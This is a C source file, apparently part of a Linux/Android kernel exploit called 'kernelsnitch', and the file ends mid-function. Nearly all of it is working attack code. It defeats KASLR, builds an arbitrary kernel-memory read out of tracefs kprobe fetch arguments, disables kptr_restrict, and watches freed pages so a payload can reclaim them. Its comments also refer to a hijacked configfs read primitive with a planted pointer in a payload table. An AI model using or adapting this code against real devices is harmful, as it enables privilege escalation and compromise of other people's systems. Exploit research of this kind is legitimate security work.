#include "common.h"
#include "kernelsnitch/kernelsnitch.h"
#include <linux/perf_event.h>
#include <linux/hw_breakpoint.h>
#include <poll.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;

/* Set to 1 in forked helper children so pr_error uses _exit and never
 * runs inherited atexit handlers (route_pi_release_atexit etc.). */
int ks_child_no_atexit;

/****************************************************************************************************************/
/* Per-boot randomized kernel layout (phys/virt randomization). Measured at runtime via tracefs kprobes. */
/****************************************************************************************************************/

uint64_t ks_p0_page_offset;
uint64_t ks_direct_map_base;
uint64_t ks_direct_map_end;
uint64_t ks_vmemmap_start;
uint64_t ks_vmemmap_end;
uint64_t ks_identity_start;
uint64_t ks_identity_end;
int ks_layout_measured;
int ks_kaslr_from_kallsyms;

#define KS_RAM_SPAN (16ULL << 30)      /* device RAM <= 14.06 GiB */
#define KS_RAM_FIRST 0x80600000ULL     /* first RAM pfn range start */
#define KS_GIB (1ULL << 30)

struct ks_layout_syms {
  uint64_t pvo;
  uint64_t vmo;
  uint64_t init_task;
  uint64_t init_uts_ns;
};

struct ks_probe_vals {
  uint64_t pvo;
  uint64_t vmo;
};

/* Tier-1 assist: tracefs event files (enable/filter/trace) are created
 * root:root 644 at registration time, so even after a root chmod -R of
 * the pre-existing tree, a uid2000 trigger cannot write them.  When
 * KS_TRACEFS_SUDO names a working su binary, retry failed writes through
 * `su -c "printf '%s' '<data>' > '<path>'"`.  On a locked device no su
 * exists -> exec fails -> returns -1, identical to no fallback. */
static int ks_sudo_write(const char *sudo, const char *path,
                         const char *data) {
  static int announced;
  char cmd[4608];
  size_t o = 0;
  const char *pre = "printf '%s' '";
  size_t plen = strlen(pre);
  if (plen >= sizeof(cmd))
    return -1;
  memcpy(cmd, pre, plen);
  o = plen;
  for (const char *s = data; *s && o + 8 < sizeof(cmd); s++) {
    if (*s == '\'') {
      memcpy(cmd + o, "'\\''", 4);
      o += 4;
    } else {
      cmd[o++] = *s;
    }
  }
  o += snprintf(cmd + o, sizeof(cmd) - o, "' > '");
  for (const char *s = path; *s && o + 8 < sizeof(cmd); s++) {
    if (*s == '\'') {
      memcpy(cmd + o, "'\\''", 4);
      o += 4;
    } else {
      cmd[o++] = *s;
    }
  }
  cmd[o++] = '\'';
  cmd[o] = 0;
  if (!announced) {
    announced = 1;
    pr_info("tracefs sudo-write via %s (KS_TRACEFS_SUDO)\n", sudo);
  }
  pid_t pid = fork();
  if (pid < 0)
    return -1;
  if (pid == 0) {
    int z = open("/dev/null", O_WRONLY | O_CLOEXEC);
    if (z >= 0) {
      dup2(z, 1);
      dup2(z, 2);
      if (z > 2)
        close(z);
    }
    execl(sudo, sudo, "-c", cmd, (char *)NULL);
    _exit(127);
  }
  int st = 0;
  if (waitpid(pid, &st, 0) != pid)
    return -1;
  return (WIFEXITED(st) && WEXITSTATUS(st) == 0) ? 0 : -1;
}

static int ks_write_file(const char *path, const char *data) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd >= 0) {
    size_t len = strlen(data);
    ssize_t n = write(fd, data, len);
    close(fd);
    if (n == (ssize_t)len)
      return 0;
  }
  const char *sudo = getenv("KS_TRACEFS_SUDO");
  if (sudo && sudo[0])
    return ks_sudo_write(sudo, path, data);
  return -1;
}

static int ks_read_file(const char *path, char *buf, size_t cap) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0)
    return -1;
  /* ftrace trace files return the content in partial chunks: a single
   * read() stopped at 4054 bytes once and buried the kvfy event behind
   * thousands of unrelated entries, which showed up as fetch no-hit with
   * rv=-1.  Drain to EOF (bounded by cap) instead. */
  size_t tot = 0;
  while (tot < cap - 1) {
    ssize_t n = read(fd, buf + tot, cap - 1 - tot);
    if (n < 0) {
      close(fd);
      return -1;
    }
    if (n == 0)
      break;
    tot += (size_t)n;
  }
  close(fd);
  buf[tot] = 0;
  return (int)tot;
}

static const char *ks_tracefs(void) {
  static char resolved[64];
  static int have;
  if (have)
    return resolved[0] ? resolved : NULL;
  have = 1;
  static const char *cands[] = {"/sys/kernel/tracing",
                                "/sys/kernel/debug/tracing", NULL};
  for (int i = 0; cands[i]; i++) {
    char p[96];
    snprintf(p, sizeof(p), "%s/kprobe_events", cands[i]);
    int fd = open(p, O_WRONLY | O_CLOEXEC);
    if (fd >= 0) {
      close(fd);
      snprintf(resolved, sizeof(resolved), "%s", cands[i]);
      return resolved;
    }
  }
  resolved[0] = 0;
  return NULL;
}

int ks_have_tracefs(void) { return ks_tracefs() != NULL; }

static void ks_disable_kprobe_events(void) {
  const char *t = ks_tracefs();
  if (!t)
    return;
  char dir[128];
  snprintf(dir, sizeof(dir), "%s/events/kprobes", t);
  DIR *d = opendir(dir);
  if (!d)
    return;
  struct dirent *e;
  while ((e = readdir(d)) != NULL) {
    if (e->d_name[0] == '.')
      continue;
    char p[256];
    snprintf(p, sizeof(p), "%s/%s/enable", dir, e->d_name);
    ks_write_file(p, "0");
  }
  closedir(d);
}

static int ks_kprobe_write(const char *payload) {
  const char *t = ks_tracefs();
  if (!t)
    return -1;
  char p[128];
  snprintf(p, sizeof(p), "%s/kprobe_events", t);
  if (ks_write_file(p, payload) == 0)
    return 0;
  ks_disable_kprobe_events();
  return ks_write_file(p, payload);
}

static int ks_kprobe_remove(const char *name) {
  const char *t = ks_tracefs();
  if (!t)
    return -1;
  char p[128], cmd[96];
  snprintf(p, sizeof(p), "%s/kprobe_events", t);
  snprintf(cmd, sizeof(cmd), "-:kprobes/%s", name);
  return ks_write_file(p, cmd);
}

static int ks_wait_trace(const char *needle, char *out, size_t cap,
                         int tries) {
  const char *t = ks_tracefs();
  if (!t)
    return -1;
  char p[128];
  snprintf(p, sizeof(p), "%s/trace", t);
  for (int i = 0; i < tries; i++) {
    if (ks_read_file(p, out, cap) >= 0 && strstr(out, needle))
      return 0;
    usleep(50000);
  }
  return -1;
}

static void ks_trace_clear(void) {
  const char *t = ks_tracefs();
  if (!t)
    return;
  char p[128];
  snprintf(p, sizeof(p), "%s/trace", t);
  ks_write_file(p, "\n");
}

static void ks_lookup_layout_syms(struct ks_layout_syms *s) {
  memset(s, 0, sizeof(*s));
  FILE *f = fopen("/proc/kallsyms", "r");
  if (!f)
    return;
  char line[384], name[256];
  unsigned long long a;
  char type;
  while (fgets(line, sizeof(line), f)) {
    if (sscanf(line, "%llx %c %255s", &a, &type, name) != 3)
      continue;
    if (!s->pvo && strcmp(name, "physvirt_offset") == 0)
      s->pvo = a;
    else if (!s->vmo && strcmp(name, "vmemmap_base") == 0)
      s->vmo = a;
    else if (!s->init_task && strcmp(name, "init_task") == 0)
      s->init_task = a;
    else if (!s->init_uts_ns && strcmp(name, "init_uts_ns") == 0)
      s->init_uts_ns = a;
  }
  fclose(f);
}

static uint64_t ks_trace_hex(const char *line, const char *key) {
  const char *p = strstr(line, key);
  if (!p)
    return 0;
  return strtoull(p + strlen(key), NULL, 0);
}

static void ks_probe_layout(struct ks_probe_vals *v) {
  memset(v, 0, sizeof(*v));
  const char *t = ks_tracefs();
  if (!t)
    return;

  /* Symbol fetch args are resolved by the kernel, so they work even when
     kptr_restrict / SELinux hide /proc/kallsyms from this uid. Note that
     @sym fetches the CONTENT at the symbol, so only data-valued symbols
     (physvirt_offset, vmemmap_base) are usable here. */
  static const char *const cmds[] = {
      "p:kprobes/kslay get_task_mm pvo=@physvirt_offset vmo=@vmemmap_base",
      "p:kprobes/kslay get_task_mm pvo=@physvirt_offset",
  };
  ks_kprobe_remove("kslay");
  char p[128];
  char buf[65536];
  int w_rc = -1;
  int en_rc = -1;
  int tr_rc = -1;
  int last_err = 0;
  snprintf(p, sizeof(p), "%s/trace", t);
  for (int attempt = 0; attempt < 2 && w_rc != 0; attempt++) {
    if (attempt > 0) {
      snprintf(p, sizeof(p), "%s/events/kprobes/kslay/enable", t);
      ks_write_file(p, "0");
      ks_kprobe_remove("kslay");
      pr_warning("layout probe no-hit, retrying\n");
    }
    int ok = 0;
    for (size_t i = 0; i < sizeof(cmds) / sizeof(cmds[0]); i++) {
      if (ks_kprobe_write(cmds[i]) == 0) {
        ok = 1;
        break;
      }
      last_err = errno;
    }
    if (!ok) {
      pr_warning("layout probe register failed errno=%d\n", last_err);
      return;
    }
    snprintf(p, sizeof(p), "%s/events/kprobes/kslay/enable", t);
    en_rc = ks_write_file(p, "1");
    snprintf(p, sizeof(p), "%s/tracing_on", t);
    tr_rc = ks_write_file(p, "1");
    ks_trace_clear();

    /* Re-trigger clear_refs on every poll: get_task_mm only fires when some
       task walks its mm, which can be sparse right after boot. */
    snprintf(p, sizeof(p), "%s/trace", t);
    for (int i = 0; i < 60 && w_rc != 0; i++) {
      int tfd = open("/proc/self/clear_refs", O_WRONLY | O_CLOEXEC);
      if (tfd >= 0) {
        if (write(tfd, "1", 1)) {}
        close(tfd);
      }
      /* clear_refs walks current->mm without get_task_mm; reading another
       * task's cmdline goes through get_task_mm for sure, so the probe fires
       * even when the system is idle.  pid1 cmdline is unreadable as
       * non-root (shell uid2000) -> fall back to our own cmdline, which
       * also goes through get_task_mm. */
      int cfd = open("/proc/1/cmdline", O_RDONLY | O_CLOEXEC);
      if (cfd < 0)
        cfd = open("/proc/self/cmdline", O_RDONLY | O_CLOEXEC);
      if (cfd >= 0) {
        char b[8];
        if (read(cfd, b, sizeof(b))) {}
        close(cfd);
      }
      if (ks_read_file(p, buf, sizeof(buf)) >= 0 && strstr(buf, "kslay:")) {
        w_rc = 0;
        break;
      }
      usleep(50000);
    }
  }
  if (w_rc != 0) {
    char head[160];
    int tn = ks_read_file(p, buf, sizeof(buf));
    int k = tn > 0 ? (tn < 159 ? tn : 159) : 0;
    for (int i = 0; i < k; i++)
      head[i] = (buf[i] == '\n' || buf[i] == '\r') ? '|' : buf[i];
    head[k] = 0;
    pr_warning("layout probe no-hit en_rc=%d tr_rc=%d errno=%d tlen=%d head=%s\n",
               en_rc, tr_rc, errno, tn, head);
  }
  if (w_rc == 0) {
    char *line = strstr(buf, "kslay:");
    v->pvo = ks_trace_hex(line, "pvo=");
    v->vmo = ks_trace_hex(line, "vmo=");
  }

  snprintf(p, sizeof(p), "%s/events/kprobes/kslay/enable", t);
  ks_write_file(p, "0");
  ks_kprobe_remove("kslay");
}

static uint64_t ks_probe_vmemmap_fallback(void) {
  const char *t = ks_tracefs();
  if (!t)
    return 0;

  ks_kprobe_remove("ksfreep");
  if (ks_kprobe_write("p:kprobes/ksfreep __free_one_page page=%x0 pfn=%x1") != 0)
    return 0;
  char p[128];
  snprintf(p, sizeof(p), "%s/events/kprobes/ksfreep/enable", t);
  ks_write_file(p, "1");
  snprintf(p, sizeof(p), "%s/tracing_on", t);
  ks_write_file(p, "1");
  ks_trace_clear();

  for (int round = 0; round < 3; round++) {
    size_t sz = 64ULL << 20;
    void *m = mmap(NULL, sz, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (m == MAP_FAILED)
      break;
    for (size_t o = 0; o < sz; o += 4096)
      ((volatile char *)m)[o] = 1;
    munmap(m, sz);
  }

  uint64_t base = 0;
  char buf[32768];
  if (ks_wait_trace("ksfreep:", buf, sizeof(buf), 20) == 0) {
    int hits = 0, agree = 0;
    char *line = buf;
    while (hits < 8 && (line = strstr(line, "ksfreep:")) != NULL) {
      uint64_t page = ks_trace_hex(line, "page=");
      uint64_t pfn = ks_trace_hex(line, "pfn=");
      if (page > 0xffff000000000000ULL && pfn < (KS_RAM_SPAN >> 12)) {
        uint64_t b = page - pfn * 0x40;
        if (hits == 0)
          base = b;
        if (b == base)
          agree++;
        hits++;
      }
      line += 7;
    }
    if (hits < 2 || agree != hits)
      base = 0;
  }

  snprintf(p, sizeof(p), "%s/events/kprobes/ksfreep/enable", t);
  ks_write_file(p, "0");
  ks_kprobe_remove("ksfreep");
  return base;
}

static int env_on(const char *name);

/* One-shot arbitrary kernel read through a one-shot kprobe fetcharg
 * batch: registers `p:kprobes/kvfy get_task_mm a0=@<addr0> ...`, triggers
 * it via get_task_mm (/proc/1/cmdline), parses all values out of the
 * trace.  Returns the number of values filled (>=0), -1 when the probe
 * could not be registered.  Addresses must be mapped kernel linear
 * addresses. */
static int ks_probe_fetch_batch(const uintptr_t *addrs, int n,
                                uint64_t *vals) {
  const char *t = ks_tracefs();
  if (!t)
    return -1;
  char cmd[4096], p[160], buf[65536];
  int off = snprintf(cmd, sizeof(cmd), "p:kprobes/kvfy get_task_mm");
  for (int i = 0; i < n && off < (int)sizeof(cmd) - 64; i++)
    off += snprintf(cmd + off, sizeof(cmd) - off, " a%d=@0x%llx", i,
                    (unsigned long long)addrs[i]);
  int lfd = open("/data/local/temp/.ks_kvfy.lock", O_CREAT | O_RDWR, 0666);
  int locked = lfd >= 0 && flock(lfd, LOCK_EX) == 0;
  int wr = -1;
  for (int attempt = 0; attempt < 3 && wr != 0; attempt++) {
    ks_kprobe_remove("kvfy");
    wr = ks_kprobe_write(cmd);
    if (wr != 0)
      usleep(20000);
  }
  int got = -1;
  int hit = 0;
  if (wr != 0) {
    pr_warning("fetch probe register failed addr0=%llx errno=%d\n",
               (unsigned long long)addrs[0], errno);
    goto out;
  }
  snprintf(p, sizeof(p), "%s/events/kprobes/kvfy/enable", t);
  ks_write_file(p, "1");
  snprintf(p, sizeof(p), "%s/tracing_on", t);
  ks_write_file(p, "1");
  ks_trace_clear();
  snprintf(p, sizeof(p), "%s/trace", t);
  for (int i = 0; i < 40 && !hit; i++) {
    int cfd = open("/proc/1/cmdline", O_RDONLY | O_CLOEXEC);
    if (cfd < 0)
      cfd = open("/proc/self/cmdline", O_RDONLY | O_CLOEXEC);
    if (cfd >= 0) {
      char b[8];
      if (read(cfd, b, sizeof(b))) {}
      close(cfd);
    }
    if (ks_read_file(p, buf, sizeof(buf)) >= 0 && strstr(buf, "kvfy:"))
      hit = 1;
    else
      usleep(25000);
  }
  if (hit) {
    char *line = strstr(buf, "kvfy:");
    char key[24];
    got = 0;
    for (int i = 0; i < n; i++) {
      snprintf(key, sizeof(key), " a%d=", i);
      vals[i] = ks_trace_hex(line, key);
      got++;
    }
  } else {
    char head[160];
    int tn = ks_read_file(p, buf, sizeof(buf));
    int k = tn > 0 ? (tn < 159 ? tn : 159) : 0;
    for (int i = 0; i < k; i++)
      head[i] = (buf[i] == '\n' || buf[i] == '\r') ? '|' : buf[i];
    head[k] = 0;
    pr_warning("fetch no-hit addr0=%llx tlen=%d tries=40 head=%s\n",
               (unsigned long long)addrs[0], tn, head);
  }
  snprintf(p, sizeof(p), "%s/events/kprobes/kvfy/enable", t);
  ks_write_file(p, "0");
  ks_kprobe_remove("kvfy");
out:
  if (locked)
    flock(lfd, LOCK_UN);
  if (lfd >= 0)
    close(lfd);
  return got;
}

static int ks_probe_fetch64(uintptr_t addr, uint64_t *out) {
  int r = ks_probe_fetch_batch(&addr, 1, out);
  return r < 0 ? -1 : (r == 1 ? 1 : 0);
}

void ks_diag_fd(const char *tag, int fd) {
  struct stat st;
  memset(&st, 0, sizeof(st));
  int sr = fstat(fd, &st);
  int lo = fcntl(0, F_DUPFD, 0);
  if (lo >= 0)
    close(lo);
  pr_info("%s fd=%d fstat=%d mode=%o lowest_free=%d\n", tag, fd, sr,
          sr == 0 ? (unsigned)st.st_mode : 0u, lo);
}

void ks_diag_table(const char *tag) {
  uint64_t io = 0, op = 0, rd = 0;
  int rio = ks_probe_fetch64(fops_table_base() + FOPS_IOCTL_OFF, &io);
  int rop = ks_probe_fetch64(fops_table_base() + FOPS_OPEN_OFF, &op);
  int rrd = ks_probe_fetch64(fops_table_base() + FOPS_CONFIGFS_READ_OFF, &rd);
  pr_info("%s tbl ioctl=%llx open=%llx read=%llx rv=%d/%d/%d\n", tag,
          (unsigned long long)io, (unsigned long long)op,
          (unsigned long long)rd, rio, rop, rrd);
}

int ks_fetch64(uintptr_t addr, uint64_t *out) {
  int r = ks_probe_fetch64(addr, out);
  if (r >= 0)
    return r;
  /* Tier-0: kprobe denied (ks_tracefs()==NULL).  Once the CFI stage has
   * a configfs-capable fd (g_fops_probe_fd, dup of the cfi fd opened
   * after the route), the same read goes through the hijacked configfs
   * primitive instead -- the kernel dereferences the planted pointer, so
   * the read works for any mapped kernel VA regardless of la0.  Only
   * safe while the payload table is alive; callers in the window already
   * treat a dead table as a bail condition. */
  if (g_fops_probe_fd >= 0) {
    uint64_t v = 0;
    if (kernel_read_data(g_fops_probe_fd, addr, &v, sizeof(v)) ==
        (ssize_t)sizeof(v)) {
      *out = v;
      pr_info("ks_fetch64 cfgfs fallback fd=%d addr=%016zx val=%016llx\n",
              g_fops_probe_fd, addr, (unsigned long long)v);
      return 1;
    }
  }
  return -1;
}

/* Watch order>=3 page frees during the teardown window: register an
 * (unfiltered by page) __free_one_page probe, read the trace after the
 * reclaim sends.  Pages freed to buddy at order>=3 are exactly what the
 * payload frag can reuse. */
static int ks_watch_armed;

static int ks_watch_frees_start(uintptr_t base) {
  ks_watch_armed = 0;
  const char *t = ks_tracefs();
  if (!t)
    return -1;
  ks_kprobe_remove("ksfree2");
  /*
   * __free_one_page(page, pfn, zone, order, mt): x0=page* (vmemmap),
   * x1=pfn, x2=zone, x3=order.  The old probe fetched order=%x2 (zone
   * pointer, huge) so the "order >= 3" filter passed every free, flooded
   * the buffer, and the read compared page* (vmemmap) against the
   * direct-map base -- base_freed could never become 1.  Filter on the
   * leaked page's own pfn instead: a handful of events, immune to spam,
   * and any hit proves the victim page reached the buddy this run.
   */
  uintptr_t base_pfn = 0;
  if (base && ks_direct_map_base && base >= ks_direct_map_base &&
      base < ks_direct_map_end)
    base_pfn = (base - ks_direct_map_base) >> 12;
  const char *cmd =
      "p:kprobes/ksfree2 __free_one_page page=%x0 pfn=%x1 order=%x3";
  /* chain12 attempt2: a single remove+write hit EEXIST (errno=17) and the
   * whole watch went silent while events() kept counting stale trace lines.
   * Retry disable+remove+append, then mark the watch untrusted on failure
   * so ks_watch_frees_events() reports -1 instead of a bogus count. */
  int wrc = -1;
  for (int i = 0; i < 5; i++) {
    char ep[160];
    snprintf(ep, sizeof(ep), "%s/events/kprobes/ksfree2/enable", t);
    ks_write_file(ep, "0");
    ks_kprobe_remove("ksfree2");
    usleep(50000);
    wrc = ks_kprobe_write(cmd);
    if (wrc == 0)
      break;
    int e = errno;
    pr_warning("free watch register try %d errno=%d\n", i + 1, e);
    if (e != EEXIST)
      break;
  }
  if (wrc != 0) {
    ks_watch_armed = 0;
    ks_trace_clear();
    pr_warning("free watch register failed after retries; "
               "base_events will read -1\n");
    return -1;
  }
  ks_watch_armed = 1;
  char p[160];
  char filt[96];
  snprintf(filt, sizeof(filt), base_pfn ? "pfn == %lu" : "order >= 3",
           (unsigned long)base_pfn);
  snprintf(p, sizeof(p), "%s/events/kprobes/ksfree2/filter", t);
  if (ks_write_file(p, filt) != 0) {
    pr_warning("free watch filter '%s' failed errno=%d\n", filt, errno);
    ks_kprobe_remove("ksfree2");
    ks_watch_armed = 0;
    return -1;
  }
  snprintf(p, sizeof(p), "%s/events/kprobes/ksfree2/enable", t);
  ks_write_file(p, "1");
  snprintf(p, sizeof(p), "%s/tracing_on", t);
  ks_write_file(p, "1");
  ks_trace_clear();
  pr_info("free watch armed base=%p pfn=%lu filter='%s'\n", (void *)base,
          (unsigned long)base_pfn, filt);
  return 0;
}

static int ks_watch_frees_read(uintptr_t *pages, int max) {
  const char *t = ks_tracefs();
  if (!t)
    return -1;
  char p[160];
  static char buf[1 << 20];
  snprintf(p, sizeof(p), "%s/trace", t);
  if (ks_read_file(p, buf, sizeof(buf)) < 0)
    return -1;
  int n = 0;
  char *line = buf;
  while (n < max && (line = strstr(line, "ksfree2:")) != NULL) {
    uint64_t pfn = ks_trace_hex(line, "pfn=");
    line += 8;
    if (!pfn)
      continue;
    /* store the direct-map virt so callers can compare against base
     * and the payload scan can kprobe-read page contents */
    uintptr_t pg = (uintptr_t)(ks_direct_map_base + (pfn << 12));
    int dup = 0;
    for (int i = 0; i < n; i++)
      if (pages[i] == pg) {
        dup = 1;
        break;
      }
    if (!dup)
      pages[n++] = pg;
  }
  return n;
}

static void ks_watch_frees_stop(void) {
  const char *t = ks_tracefs();
  if (!t)
    return;
  char p[160];
  snprintf(p, sizeof(p), "%s/events/kprobes/ksfree2/enable", t);
  ks_write_file(p, "0");
  ks_kprobe_remove("ksfree2");
  ks_watch_armed = 0;
}

/* count of base-pfn free events accumulated since ks_watch_frees_start */
int ks_watch_frees_events(void) {
  if (!ks_watch_armed)
    return -1;
  const char *t = ks_tracefs();
  if (!t)
    return -1;
  char p[160];
  static char buf[1 << 20];
  snprintf(p, sizeof(p), "%s/trace", t);
  if (ks_read_file(p, buf, sizeof(buf)) < 0)
    return -1;
  int n = 0;
  for (char *line = buf; (line = strstr(line, "ksfree2:")) != NULL; line += 8)
    n++;
  return n;
}

// Layout env values come from %016llx-style hex dumps. strtoull(...,0)
// would parse a leading-zero string as OCTAL (0000007900000000 -> 7),
// so parse bare values as hex; an explicit 0x/0X prefix also works.
static uint64_t ks_env_hex(const char *s) {
  return strtoull(s, NULL, 16);
}

static void ks_layout_apply(uint64_t pvo, uint64_t vmem) {
  uint64_t la0 = pvo ? (uint64_t)(-(int64_t)pvo) : 0;
  if (pvo && (la0 >> 48) == 0xffff) {
    ks_p0_page_offset = la0 + P0_PHYS_OFFSET;
    ks_direct_map_base = la0;
    ks_direct_map_end = la0 + KS_RAM_SPAN;
    ks_identity_start = (la0 + KS_RAM_FIRST) & ~(KS_GIB - 1);
    ks_identity_end = (la0 + KS_RAM_SPAN + KS_GIB - 1) & ~(KS_GIB - 1);
    ks_layout_measured = 1;
  }
  if (vmem) {
    ks_vmemmap_start = vmem;
    ks_vmemmap_end = vmem + ((KS_RAM_SPAN >> 12) * 0x40);
  }
}

void ks_layout_init(void) {
  ks_p0_page_offset = KS_TARGET_P0_PAGE_OFFSET;
  ks_direct_map_base = KS_TARGET_DIRECT_MAP_BASE;
  ks_direct_map_end = KS_TARGET_DIRECT_MAP_END;
  ks_vmemmap_start = KS_TARGET_VMEMMAP_START;
  ks_vmemmap_end = KS_TARGET_VMEMMAP_START +
                   (((KS_TARGET_DIRECT_MAP_END - KS_TARGET_DIRECT_MAP_BASE) >>
                     12) * 0x40);
  ks_identity_start = KS_TARGET_IDENTITY_START;
  ks_identity_end = KS_TARGET_IDENTITY_END;

  uint64_t pvo = 0, vmem = 0;
  const char *src = "static";
  const char *e_pvo = getenv("KS_LAYOUT_PVO");
  const char *e_vm = getenv("KS_LAYOUT_VM");
  if (e_pvo && e_pvo[0])
    pvo = ks_env_hex(e_pvo);
  if (e_vm && e_vm[0])
    vmem = ks_env_hex(e_vm);
  if (pvo || vmem)
    src = "env";

  ks_write_file("/proc/sys/kernel/kptr_restrict", "0");

  const char *e_kaslr = getenv("KS_LAYOUT_KASLR");
  if (e_kaslr && e_kaslr[0]) {
    uint64_t base = ks_env_hex(e_kaslr);
    if (base > 0xffffff0000000000ULL) {
      kaslr_base = base;
      kaslr_slide = base - KIMAGE_TEXT_BASE;
      kaslr_done = 1;
      ks_kaslr_from_kallsyms = 1;
    }
  }

  if (!kaslr_done) {
    struct ks_layout_syms syms;
    ks_lookup_layout_syms(&syms);
    if (syms.init_task && syms.init_uts_ns) {
      uint64_t b1 = syms.init_task - INIT_TASK_OFF;
      uint64_t b2 = syms.init_uts_ns - INIT_UTS_NS_OFF;
      if (b1 == b2 && b1 > 0xffffff0000000000ULL) {
        kaslr_base = b1;
        kaslr_slide = b1 - KIMAGE_TEXT_BASE;
        kaslr_done = 1;
        ks_kaslr_from_kallsyms = 1;
      } else {
        pr_warning("kallsyms kaslr base mismatch init_task=%016llx "
                   "uts=%016llx\n",
                   (unsigned long long)b1, (unsigned long long)b2);
      }
    }
  }

  if (!pvo || !vmem) {
    struct ks_probe_vals pv;
    ks_probe_layout(&pv);
    if (!pvo && pv.pvo) {
      pvo = pv.pvo;
      src = "kprobe";
    }
    if (!vmem && pv.vmo) {
      vmem = pv.vmo;
      src = "kprobe";
    }
    if (!vmem)
      vmem = ks_probe_vmemmap_fallback();
    if (!pvo && !pv.pvo && vmem)
      src = "kprobe-partial";
  }

  ks_layout_apply(pvo, vmem);

  pr_success("layout %s measured=%d pvo=%016llx la0=%016llx "
             "p0=%016llx vmemmap=[%016llx-%016llx] "
             "window=[%016llx-%016llx] kaslr=%s%016llx\n",
             src, ks_layout_measured, (unsigned long long)pvo,
             (unsigned long long)ks_direct_map_base,
             (unsigned long long)ks_p0_page_offset,
             (unsigned long long)ks_vmemmap_start,
             (unsigned long long)ks_vmemmap_end,
             (unsigned long long)ks_identity_start,
             (unsigned long long)ks_identity_end,
             ks_kaslr_from_kallsyms ? "derived" : "pending",
             (unsigned long long)(kaslr_done ? kaslr_base : 0));
  if (!ks_layout_measured)
    pr_warning("layout measurement failed; static target fallback in effect "
               "(override via KS_LAYOUT_PVO / KS_LAYOUT_VM / "
               "KSNITCH_IDENTITY_START / KSNITCH_IDENTITY_END)\n");
}

/* Tier-0 la0 candidate: the futex-hash-verified mm page base is a real
 * physmap address, so la0 = align_down(base, 1GiB) - 2GiB lands within
 * one 1GiB grid of the true physmap base (RAM starts at 2GiB physical on
 * this SoC; P0_PHYS_OFFSET = 0x80000000).  The 1GiB alignment keeps the
 * data_addr OR arithmetic exact; the +/-16GiB window check below is
 * near-trivially satisfied for any candidate this close.  The exact
 * values overwrite this later via ks_layout_measure_cfgfs(). */
static void ks_layout_infer_from_leak(uintptr_t base) {
  if (ks_layout_measured)
    return;
  uint64_t la0 = (base & ~((uint64_t)KS_GIB - 1)) - 2 * (uint64_t)KS_GIB;
  if ((la0 >> 48) != 0xffff)
    return;
  ks_p0_page_offset = la0 + P0_PHYS_OFFSET;
  ks_direct_map_base = la0;
  ks_direct_map_end = la0 + KS_RAM_SPAN;
  ks_identity_start = (la0 + KS_RAM_FIRST) & ~(KS_GIB - 1);
  ks_identity_end = (la0 + KS_RAM_SPAN + KS_GIB - 1) & ~(KS_GIB - 1);
  ks_layout_measured = 1;
  pr_info("layout infer-from-leak base=%016zx la0=%016llx p0=%016llx "
          "vmemmap=[%016llx-%016llx]\n",
          base, (unsigned long long)la0,
          (unsigned long long)ks_p0_page_offset,
          (unsigned long long)ks_vmemmap_start,
          (unsigned long long)ks_vmemmap_end);
}

/* Post-hijack exact layout: with the configfs read primitive live (fd
 * served by the payload table), pull physvirt_offset / vmemmap / memstart
 * out of .data and apply the exact values over whatever infer-from-leak
 * put in place.  Image .data kernel VAs work as configfs read targets
 * regardless of la0 -- the kernel dereferences the planted pointer itself.
 * Requires kaslr_done so text_addr() carries the slide. */
int ks_layout_measure_cfgfs(int fd) {
  if (!kaslr_done) {
    pr_warning("layout cfgfs measure skipped: kaslr not done yet\n");
    return 0;
  }
  uint64_t pvo = 0, vmem = 0, mst = 0;
  uintptr_t pvo_addr = text_addr(KIMAGE_TEXT_BASE + PHYSVIRT_OFFSET_OFF);
  uintptr_t vmem_addr = text_addr(KIMAGE_TEXT_BASE + VMEMMAP_OFF);
  uintptr_t mst_addr = text_addr(KIMAGE_TEXT_BASE + MEMSTART_ADDR_OFF);
  pr_info("layout cfgfs measure addrs pvo=%016zx vmem=%016zx mst=%016zx\n",
          pvo_addr, vmem_addr, mst_addr);
  ssize_t r1 = kernel_read_data(fd, pvo_addr, &pvo, sizeof(pvo));
  pr_info("layout cfgfs measure r1=%zd pvo=%016llx\n", r1,
          (unsigned long long)pvo);
  ssize_t r2 = kernel_read_data(fd, vmem_addr, &vmem, sizeof(vmem));
  pr_info("layout cfgfs measure r2=%zd vmem=%016llx\n", r2,
          (unsigned long long)vmem);
  ssize_t r3 = kernel_read_data(fd, mst_addr, &mst, sizeof(mst));
  pr_info("layout cfgfs measure rv=%zd/%zd/%zd pvo=%016llx vmem=%016llx "
          "memstart=%016llx\n",
          r1, r2, r3, (unsigned long long)pvo, (unsigned long long)vmem,
          (unsigned long long)mst);
  if (r1 != (ssize_t)sizeof(pvo) || r2 != (ssize_t)sizeof(vmem))
    return 0;
  uint64_t la0 = pvo ? (uint64_t)(-(int64_t)pvo) : 0;
  if (!pvo || (la0 >> 48) != 0xffff) {
    pr_warning("layout cfgfs measure: implausible pvo=%016llx; keep current\n",
               (unsigned long long)pvo);
    return 0;
  }
  if (!vmem || (vmem >> 48) != 0xffff) {
    pr_warning("layout cfgfs measure: implausible vmem=%016llx; keep current\n",
               (unsigned long long)vmem);
    return 0;
  }
  ks_layout_apply(pvo, vmem);
  pr_success("layout cfgfs exact pvo=%016llx la0=%016llx p0=%016llx "
             "vmemmap=[%016llx-%016llx] memstart=%016llx\n",
             (unsigned long long)pvo, (unsigned long long)la0,
             (unsigned long long)ks_p0_page_offset,
             (unsigned long long)ks_vmemmap_start,
             (unsigned long long)ks_vmemmap_end,
             (unsigned long long)mst);
  return 1;
}

static size_t env_size_t_default(const char *name, size_t def,
                                 size_t min, size_t max) {
  const char *arg = getenv(name);
  if (arg && arg[0]) {
    char *end = NULL;
    unsigned long long val = strtoull(arg, &end, 0);
    if (end && *end == '\0' && val >= min && val <= max) {
      return (size_t)val;
    }
    pr_warning("bad %s value=%s; using %#zx\n", name, arg, def);
  }
  return def;
}

static int env_flag_default(const char *name, int def) {
  const char *arg = getenv(name);
  if (!arg || !arg[0]) {
    return def;
  }
  return strcmp(arg, "0") != 0 && strcasecmp(arg, "false") != 0 &&
         strcasecmp(arg, "no") != 0;
}

static int get_ksnitch_collisions(void) {
  const char *arg = getenv("KSNITCH_COLLISIONS");
  if (arg) {
    int val = atoi(arg);
    if (val > 0) return val;
  }
  return KSNITCH_COLLISIONS;
}

static size_t slabinfo_mm_struct_sz(void) {
